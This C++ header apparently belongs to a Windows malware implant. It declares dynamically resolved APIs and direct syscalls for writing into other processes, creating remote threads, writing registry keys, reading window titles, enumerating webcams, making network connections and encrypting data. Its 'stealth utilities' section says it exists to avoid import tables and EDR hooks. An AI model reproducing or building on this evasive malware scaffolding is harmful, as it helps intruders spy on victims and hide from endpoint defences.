#pragma once
#include "Resolver.h"
#include "Syscalls.h"
namespace Internal {
    bool Initialize();
    extern Resolver::LoadLibraryA_t _LoadLibraryA;
    extern Resolver::GetProcAddress_t _GetProcAddress;
    extern Resolver::MultiByteToWideChar_t _MultiByteToWideChar;
    extern Resolver::GetSystemInfo_t _GetSystemInfo;
    extern Resolver::VirtualProtect_t _VirtualProtect;
    extern Resolver::VirtualAlloc_t _VirtualAlloc;
    extern Resolver::VirtualFree_t _VirtualFree;
    extern Resolver::GetModuleHandleA_t _GetModuleHandleA;
    extern Resolver::GetComputerNameA_t _GetComputerNameA;
    extern Resolver::GetSystemDirectoryA_t _GetSystemDirectoryA;
    extern Resolver::GetDiskFreeSpaceExA_t _GetDiskFreeSpaceExA;
    extern Resolver::GlobalMemoryStatusEx_t _GlobalMemoryStatusEx;
    extern Resolver::GetCurrentProcessId_t _GetCurrentProcessId;
    extern Resolver::GetCurrentThreadId_t _GetCurrentThreadId;
    extern Resolver::SetProcessWorkingSetSize_t _SetProcessWorkingSetSize;
    extern Resolver::SetThreadExecutionState_t _SetThreadExecutionState;
    extern Resolver::GetTickCount_t _GetTickCount;
    extern Resolver::CreateMutexA_t _CreateMutexA;
    extern Resolver::GetLastError_t _GetLastError;
    extern Resolver::GetModuleFileNameA_t _GetModuleFileNameA;
    extern Resolver::FileTimeToSystemTime_t _FileTimeToSystemTime;
    extern Resolver::CreateFileA_t _CreateFileA;
    extern Resolver::GetFileTime_t _GetFileTime;
    extern Resolver::CloseHandle_t _CloseHandle;
    extern Resolver::GetProcessHeap_t _GetProcessHeap;
    extern Resolver::HeapAlloc_t _HeapAlloc;
    extern Resolver::HeapFree_t _HeapFree;
    extern Resolver::CreateFileMappingA_t _CreateFileMappingA;
    extern Resolver::MapViewOfFile_t _MapViewOfFile;
    extern Resolver::UnmapViewOfFile_t _UnmapViewOfFile;
    extern Resolver::GetUserNameA_t _GetUserNameA;
    extern Resolver::RegCreateKeyExA_t _RegCreateKeyExA;
    extern Resolver::RegSetValueExA_t _RegSetValueExA;
    extern Resolver::RegOpenKeyExA_t _RegOpenKeyExA;
    extern Resolver::RegQueryValueExA_t _RegQueryValueExA;
    extern Resolver::RegCloseKey_t _RegCloseKey;
    extern Resolver::OpenProcessToken_t _OpenProcessToken;
    extern Resolver::GetTokenInformation_t _GetTokenInformation;
    extern Resolver::GetForegroundWindow_t _GetForegroundWindow;
    extern Resolver::GetWindowTextA_t _GetWindowTextA;
    extern Resolver::GetLastInputInfo_t _GetLastInputInfo;
    extern Resolver::EnumDisplayDevicesA_t _EnumDisplayDevicesA;
    extern Resolver::WSAStartup_t _WSAStartup;
    extern Resolver::WSACleanup_t _WSACleanup;
    extern Resolver::socket_t _socket;
    extern Resolver::connect_t _connect;
    extern Resolver::send_t _send;
    extern Resolver::recv_t _recv;
    extern Resolver::closesocket_t _closesocket;
    extern Resolver::getaddrinfo_t _getaddrinfo;
    extern Resolver::freeaddrinfo_t _freeaddrinfo;
    extern Resolver::setsockopt_t _setsockopt;
    extern Resolver::InternetOpenA_t _InternetOpenA;
    extern Resolver::InternetOpenUrlA_t _InternetOpenUrlA;
    extern Resolver::InternetReadFile_t _InternetReadFile;
    extern Resolver::InternetCloseHandle_t _InternetCloseHandle;
    extern Resolver::CryptStringToBinaryA_t _CryptStringToBinaryA;
    extern Resolver::BCryptOpenAlgorithmProvider_t _BCryptOpenAlgorithmProvider;
    extern Resolver::BCryptGetProperty_t _BCryptGetProperty;
    extern Resolver::BCryptCreateHash_t _BCryptCreateHash;
    extern Resolver::BCryptHashData_t _BCryptHashData;
    extern Resolver::BCryptFinishHash_t _BCryptFinishHash;
    extern Resolver::BCryptDestroyHash_t _BCryptDestroyHash;
    extern Resolver::BCryptCloseAlgorithmProvider_t _BCryptCloseAlgorithmProvider;
    extern Resolver::BCryptGenRandom_t _BCryptGenRandom;
    extern Resolver::BCryptSetProperty_t _BCryptSetProperty;
    extern Resolver::BCryptGenerateSymmetricKey_t _BCryptGenerateSymmetricKey;
    extern Resolver::BCryptEncrypt_t _BCryptEncrypt;
    extern Resolver::BCryptDecrypt_t _BCryptDecrypt;
    extern Resolver::BCryptDestroyKey_t _BCryptDestroyKey;
    extern Resolver::CoInitializeEx_t _CoInitializeEx;
    extern Resolver::CoInitializeSecurity_t _CoInitializeSecurity;
    extern Resolver::CoCreateInstance_t _CoCreateInstance;
    extern Resolver::CoUninitialize_t _CoUninitialize;
    extern Resolver::VariantClear_t _VariantClear;
    extern Resolver::capGetDriverDescriptionA_t _capGetDriverDescriptionA;
    extern Resolver::IsUserAnAdmin_t _IsUserAnAdmin;
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    NTSTATUS NtClose(HANDLE Handle);
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle, ULONG ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval);
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PVOID ClientId);
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    void SleepMs(DWORD milliseconds);

    // === STEALTH UTILITIES (IAT-free replacements) ===

    // Replaces srand()/rand() — uses BCryptGenRandom, fallback to RDTSC
    inline DWORD SecureRand(DWORD maxVal) {
        if (maxVal == 0) return 0;
        DWORD val = 0;
        if (_BCryptGenRandom) {
            _BCryptGenRandom(NULL, (PUCHAR)&val, sizeof(val), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        } else {
            // Fallback: RDTSC-based entropy
            unsigned __int64 tsc = __rdtsc();
            val = (DWORD)(tsc ^ (tsc >> 17));
#ifdef _WIN64
            val ^= (DWORD)__readgsqword(0x40);
#else
            val ^= (DWORD)__readfsdword(0x20);
#endif
        }
        return val % maxVal;
    }

    // Replaces memcpy() in security-sensitive paths — avoids CRT import + EDR hooks
    static __forceinline void SecureCopy(void* dst, const void* src, size_t len) {
        volatile unsigned char* d = (volatile unsigned char*)dst;
        const unsigned char* s = (const unsigned char*)src;
        for (size_t i = 0; i < len; i++) d[i] = s[i];
    }

    // Replaces strcmp() — inline, no CRT dependency
    static __forceinline bool InlineStrEq(const char* a, const char* b) {
        while (*a && *b) {
            if (*a != *b) return false;
            a++; b++;
        }
        return *a == *b;
    }

    // Replaces toupper() — inline, no CRT locale dependency
    static __forceinline char InlineToUpper(char c) {
        return (c >= 'a' && c <= 'z') ? (c - 32) : c;
    }

    // Inline integer to string (replaces sprintf_s for simple formatting)
    static __forceinline void IntToStr(int val, char* buf, int bufLen) {
        if (bufLen <= 0) return;
        if (val < 0) { *buf++ = '-'; bufLen--; val = -val; }
        char tmp[16]; int i = 0;
        do { tmp[i++] = '0' + (val % 10); val /= 10; } while (val && i < 15);
        for (int j = i - 1; j >= 0 && bufLen > 1; j--, bufLen--) *buf++ = tmp[j];
        *buf = 0;
    }

    // Inline byte to hex string (replaces stringstream hex formatting)
    static __forceinline void ByteToHex(unsigned char b, char* out) {
        const char hex[] = "0123456789abcdef";
        out[0] = hex[b >> 4];
        out[1] = hex[b & 0x0F];
    }
}
